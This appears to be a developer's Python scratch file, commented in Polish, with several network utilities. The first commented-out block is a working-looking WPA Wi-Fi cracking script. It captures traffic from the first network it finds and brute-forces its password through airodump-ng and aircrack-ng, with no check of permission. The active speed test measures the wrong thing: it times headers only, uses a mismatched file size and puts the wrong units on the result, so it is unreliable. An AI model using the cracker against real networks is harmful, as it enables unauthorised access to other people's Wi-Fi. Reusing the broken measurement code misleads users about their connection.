# # import itertools
# # import string
# # import subprocess
# # import re
# # import time
# #
# #
# # def generate_passwords(length):
# #     chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
# #     for password in itertools.product(chars, repeat=length):
# #         yield ''.join(password)
# #
# #
# # def find_wifi(network_interface):
# #     # Komenda do skanowania dostępnych sieci Wi-Fi
# #     airodump_scan_command = [
# #         "airodump-ng",
# #         network_interface
# #     ]
# #
# #     # Uruchomienie airodump-ng do skanowania sieci Wi-Fi
# #     try:
# #         airodump_scan_process = subprocess.Popen(airodump_scan_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
# #
# #         # Poczekaj na zakończenie procesu airodump-ng lub timeout po 60 sekundach
# #         stdout, stderr = airodump_scan_process.communicate(timeout=60)
# #     except subprocess.TimeoutExpired:
# #         print("Timeout - Przekroczono czas oczekiwania na zakończenie skanowania.")
# #         airodump_scan_process.kill()
# #         stdout, stderr = airodump_scan_process.communicate()
# #
# #     # Odczytaj wyniki skanowania sieci Wi-Fi
# #     output = stdout.decode()
# #
# #     # Wyodrębnij informacje o dostępnych sieciach Wi-Fi
# #     networks = re.findall(r"([0-9A-F:]+).*?WPA.*?(ESSID:.*?)(,|$)", output, re.DOTALL)
# #
# #     return networks
# #
# #
# # def crack_wifi(network_interface, bssid, min_length, max_length):
# #     # Ustawienie nazwy pliku do przechwytywania pakietów
# #     capture_file = "capture-01.cap"
# #
# #     # Komenda do przechwytywania pakietów
# #     airodump_command = [
# #         "airodump-ng",
# #         "-w", capture_file,
# #         "--bssid", bssid,
# #         network_interface
# #     ]
# #
# #     # Uruchomienie airodump-ng do przechwytywania pakietów
# #     airodump_process = subprocess.Popen(airodump_command)
# #
# #     print("Przechwytywanie pakietów... (Zatrzymaj po kilku minutach za pomocą Ctrl+C)")
# #
# #     try:
# #         # Pozwól airodump-ng działać przez kilka minut
# #         airodump_process.wait(timeout=300)  # Przechwytywanie przez 5 minut
# #     except subprocess.TimeoutExpired:
# #         pass
# #
# #     # Zakończ przechwytywanie pakietów
# #     airodump_process.terminate()
# #
# #     for length in range(min_length, max_length + 1):
# #         print(f"Próba z hasłami o długości: {length}")
# #         for password in generate_passwords(length):
# #             # Komenda do łamania hasła za pomocą aircrack-ng
# #             aircrack_command = [
# #                 "aircrack-ng",
# #                 "-b", bssid,
# #                 "-w", "-",  # Użycie stdin jako źródła słownika
# #                 capture_file
# #             ]
# #
# #             aircrack_process = subprocess.Popen(aircrack_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
# #                                                 stderr=subprocess.PIPE)
# #             aircrack_process.stdin.write(f"{password}\n".encode())
# #             aircrack_process.stdin.close()
# #
# #             output = aircrack_process.stdout.read().decode()
# #             print(output)
# #             aircrack_process.stdout.close()
# #
# #             if "KEY FOUND!" in output:
# #                 print(f"Hasło znalezione: {password}")
# #                 return password
# #             else:
# #                 print(f"Próba hasła: {password}")
# #
# #     print("Nie udało się znaleźć hasła")
# #     return None
# #
# #
# # if __name__ == "__main__":
# #     # Parametry funkcji
# #     network_interface = "wlan0mon"  # Interfejs sieciowy
# #     min_length = 8  # Minimalna długość hasła
# #     max_length = 10  # Maksymalna długość hasła
# #
# #     # Znajdź dostępne sieci Wi-Fi
# #     networks = find_wifi(network_interface)
# #
# #     # Wybierz pierwszą znalezioną sieć Wi-Fi i spróbuj złamać jej hasło
# #     if networks:
# #         bssid, essid, _ = networks[0]
# #         print(f"Znaleziono sieć Wi-Fi: {essid.strip('ESSID:')} (BSSID: {bssid})")
# #         crack_wifi(network_interface, bssid, min_length, max_length)
# #     else:
# #         print("Nie znaleziono żadnych sieci Wi-Fi")
#
#
#
# import os
# import psutil
# import time
# import subprocess
#
#
# def measure_download_speed(url="http://ipv4.download.thinkbroadband.com/10MB.zip"):
#     start_time = time.time()
#     result = subprocess.run(['curl', '-o', '/dev/null', url], capture_output=True, text=True)
#     end_time = time.time()
#
#     # Obliczanie prędkości pobierania w Mbps
#     file_size = 10 * 1024 * 1024  # 10 MB w bajtach
#     duration = end_time - start_time  # Czas w sekundach
#     download_speed = (file_size * 8) / (duration * 1_000_000)  # Prędkość w Mbps
#
#     return download_speed
#
#
# def measure_upload_speed(file_path="upload_test_file"):
#     # Utworzenie pliku testowego o rozmiarze 10 MB
#     with open(file_path, 'wb') as f:
#         f.write(os.urandom(10 * 1024 * 1024))  # 10 MB losowych danych
#
#     start_time = time.time()
#     result = subprocess.run(['curl', '-T', file_path, 'ftp://speedtest.tele2.net/upload'], capture_output=True,
#                             text=True)
#     end_time = time.time()
#
#     # Obliczanie prędkości wysyłania w Mbps
#     file_size = 10 * 1024 * 1024  # 10 MB w bajtach
#     duration = end_time - start_time  # Czas w sekundach
#     upload_speed = (file_size * 8) / (duration * 1_000_000)  # Prędkość w Mbps
#
#     # Usunięcie pliku testowego
#     os.remove(file_path)
#
#     return upload_speed
#
#
# def measure_ping(host='8.8.8.8'):
#     result = subprocess.run(['ping', '-c', '4', host], capture_output=True, text=True)
#     output = result.stdout.split('\n')
#     for line in output:
#         if 'avg' in line:
#             avg_latency = line.split('/')[4]
#             return f"Average ping to {host}: {avg_latency} ms"
#     return "Ping failed"
#
#
# def measure_network_usage(interval=1):
#     net_before = psutil.net_io_counters()
#     time.sleep(interval)
#     net_after = psutil.net_io_counters()
#
#     sent_bytes = net_after.bytes_sent - net_before.bytes_sent
#     recv_bytes = net_after.bytes_recv - net_before.bytes_recv
#
#     return {'bytes_sent': sent_bytes, 'bytes_recv': recv_bytes}
#
#
# def main():
#     # Measure download speed
#     print("Measuring download speed...")
#     download_speed = measure_download_speed()
#     print(f"Download Speed: {download_speed:.2f} Mbps")
#
#     # Measure upload speed
#     print("Measuring upload speed...")
#     upload_speed = measure_upload_speed()
#     print(f"Upload Speed: {upload_speed:.2f} Mbps")
#
#     # Measure ping
#     print("Measuring ping...")
#     ping_result = measure_ping()
#     print(ping_result)
#
#     # Measure network usage
#     print("Measuring network usage for 5 seconds...")
#     network_usage = measure_network_usage(interval=5)
#     print(f"Bytes sent: {network_usage['bytes_sent']}")
#     print(f"Bytes received: {network_usage['bytes_recv']}")
#
#
# if __name__ == "__main__":
#     main()

# import psutil
# from scapy.all import *
# from tabulate import tabulate
# import time
#
#
# # Funkcja sprawdzająca procesy systemowe
# def check_system_processes():
#     anomalies = []
#     for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
#         try:
#             # Pobranie informacji o procesie
#             process_info = proc.info
#             # Sprawdzenie anomalii (np. wysokie użycie CPU i RAM)
#             if process_info['cpu_percent'] > 80:
#                 anomalies.append(
#                     f"High CPU usage by {process_info['name']} (PID: {process_info['pid']}): {process_info['cpu_percent']}%")
#             if process_info['memory_percent'] > 80:
#                 anomalies.append(
#                     f"High Memory usage by {process_info['name']} (PID: {process_info['pid']}): {process_info['memory_percent']}%")
#         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
#             continue
#     return anomalies
#
#
# # Funkcja sprawdzająca ruch sieciowy
# def check_network_traffic():
#     anomalies = []
#     packet_count = {}
#
#     def packet_callback(packet):
#         packet_info = {}
#         try:
#             if Ether in packet:
#                 eth_layer = packet[Ether]
#                 packet_info['Ethernet_dst'] = eth_layer.dst
#                 packet_info['Ethernet_src'] = eth_layer.src
#                 packet_info['Ethernet_type'] = eth_layer.type
#
#             if IP in packet:
#                 ip_layer = packet[IP]
#                 packet_info['IP_src'] = ip_layer.src
#                 packet_info['IP_dst'] = ip_layer.dst
#                 packet_info['IP_proto'] = ip_layer.proto
#
#             if TCP in packet:
#                 tcp_layer = packet[TCP]
#                 packet_info['TCP_sport'] = tcp_layer.sport
#                 packet_info['TCP_dport'] = tcp_layer.dport
#                 packet_info['TCP_flags'] = tcp_layer.flags
#
#             if UDP in packet:
#                 udp_layer = packet[UDP]
#                 packet_info['UDP_sport'] = udp_layer.sport
#                 packet_info['UDP_dport'] = udp_layer.dport
#
#             if ICMP in packet:
#                 icmp_layer = packet[ICMP]
#                 packet_info['ICMP_type'] = icmp_layer.type
#                 packet_info['ICMP_code'] = icmp_layer.code
#
#             # Zamiana słownika na krotkę (dzięki czemu możemy używać jako klucz w słowniku)
#             packet_key = tuple(packet_info.items())
#
#             if packet_key in packet_count:
#                 packet_count[packet_key] += 1
#             else:
#                 packet_count[packet_key] = 1
#
#         except Exception as e:
#             anomalies.append(f"Error processing packet: {e}")
#
#     # Przechwytywanie ruchu sieciowego (przez 10 sekund)
#     sniff(prn=packet_callback, timeout=10)
#
#     # Konwersja liczników pakietów do listy słowników
#     packet_data = []
#     for packet_key, count in packet_count.items():
#         packet_info = dict(packet_key)
#         packet_info['Count'] = count
#         packet_data.append(packet_info)
#
#     return anomalies, packet_data
#
#
# # Funkcja monitorująca
# def monitor_system_and_network():
#     while True:
#         print("Scanning for anomalies...")
#
#         # Monitorowanie procesów
#         process_anomalies = check_system_processes()
#         for anomaly in process_anomalies:
#             print(f"Process anomaly detected: {anomaly}")
#
#         # Monitorowanie ruchu sieciowego
#         network_anomalies, packet_data = check_network_traffic()
#         for anomaly in network_anomalies:
#             print(f"Network anomaly detected: {anomaly}")
#
#         if packet_data:
#             print("\nCaptured Packets:")
#             print(tabulate(packet_data, headers="keys", tablefmt="pretty"))
#
#         # Odczekaj przed kolejnym skanowaniem
#         time.sleep(5)  # 60 sekund przerwy
#
#
#
# monitor_system_and_network()
#

# from pysnmp.hlapi import *
#
# def snmp_get(ip, community, oid):
#     """
#     Wykonuje zapytanie SNMP GET do urządzenia.
#     :param ip: Adres IP urządzenia
#     :param community: Społeczność SNMP (community string)
#     :param oid: OID (Object Identifier) do pobrania
#     :return: Wartość OID
#     """
#     error_indication, error_status, error_index, var_binds = next(
#         getCmd(SnmpEngine(),
#                CommunityData(community, mpModel=0),
#                UdpTransportTarget((ip, 161)),
#                ContextData(),
#                ObjectType(ObjectIdentity(oid)))
#     )
#
#     if error_indication:
#         print(f"Błąd: {error_indication}")
#     elif error_status:
#         print(f"Błąd: {error_status.prettyPrint()}")
#     else:
#         for var_bind in var_binds:
#             return var_bind.prettyPrint().split('=')[1].strip()
#
# def discover_devices(ips, community):
#     """
#     Wykrywa urządzenia w podanej sieci SNMP.
#     :param ips: Lista adresów IP do przeszukania
#     :param community: Społeczność SNMP (community string)
#     :return: Lista wykrytych urządzeń
#     """
#     devices = []
#     for ip in ips:
#         try:
#             sys_descr = snmp_get(ip, community, '1.3.6.1.2.1.1.1.0')  # OID dla system description
#             if sys_descr:
#                 devices.append({'ip': ip, 'description': sys_descr})
#         except Exception as e:
#             print(f"Błąd podczas próby połączenia z {ip}: {e}")
#     return devices
#
# # Lista IP do przeszukania
# ips = ['192.168.88.1', '192.168.1.2', '192.168.1.3']
#
# # Społeczność SNMP
# community = 'public'
#
# # Wykrywanie urządzeń
# devices = discover_devices(ips, community)
#
# # Wyświetlanie wykrytych urządzeń
# for device in devices:
#     print(f"IP: {device['ip']}, Opis: {device['description']}")


import time
import requests
import subprocess
from prettytable import PrettyTable

# Ustal URL i rozmiar pliku do testowania
DOWNLOAD_URL = "http://ipv4.download.thinkbroadband.com/5MB.zip"
UPLOAD_URL = "https://httpbin.org/post"
FILE_SIZE_MB = 10  # Rozmiar pliku do testowania (MB)
PING_HOST = "8.8.8.8"  # Przykładowy adres IP do testu ping


def perform_speed_and_ping_tests():
    def measure_download_speed(url, file_size_mb):
        start_time = time.time()
        response = requests.get(url, stream=True)
        end_time = time.time()

        elapsed_time = end_time - start_time
        speed_mbps = file_size_mb / elapsed_time
        return speed_mbps

    def measure_upload_speed(url, file_size_mb):
        file_data = b'a' * (file_size_mb * 1024 * 1024)
        start_time = time.time()
        response = requests.post(url, data=file_data)
        end_time = time.time()

        elapsed_time = end_time - start_time
        speed_mbps = file_size_mb / elapsed_time
        return speed_mbps

    def measure_ping(host):
        try:
            result = subprocess.run(
                ["ping", "-c", "4", host],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            output = result.stdout
            # Szukamy linii zawierającej średni czas odpowiedzi
            for line in output.splitlines():
                if "avg" in line:
                    avg_ping = line.split("avg/")[1].split("/")[0]
                    return float(avg_ping)
        except Exception as e:
            print(f"Błąd podczas wykonywania pingu: {e}")
            return None

    # Wykonanie testów
    download_speed = measure_download_speed(DOWNLOAD_URL, FILE_SIZE_MB)
    upload_speed = measure_upload_speed(UPLOAD_URL, FILE_SIZE_MB)
    ping_time = measure_ping(PING_HOST)

    # Utworzenie tabeli
    table = PrettyTable()
    table.field_names = ["Metryka", "Wynik"]
    table.add_row(["Średnia prędkość pobierania (Mbps)", round(download_speed, 2)])
    table.add_row(["Średnia prędkość wysyłania (Mbps)", round(upload_speed, 2)])
    table.add_row(["Czas odpowiedzi ping (ms)", round(ping_time, 2) if ping_time else "Brak danych"])

    print(table)


# Uruchomienie funkcji
perform_speed_and_ping_tests()

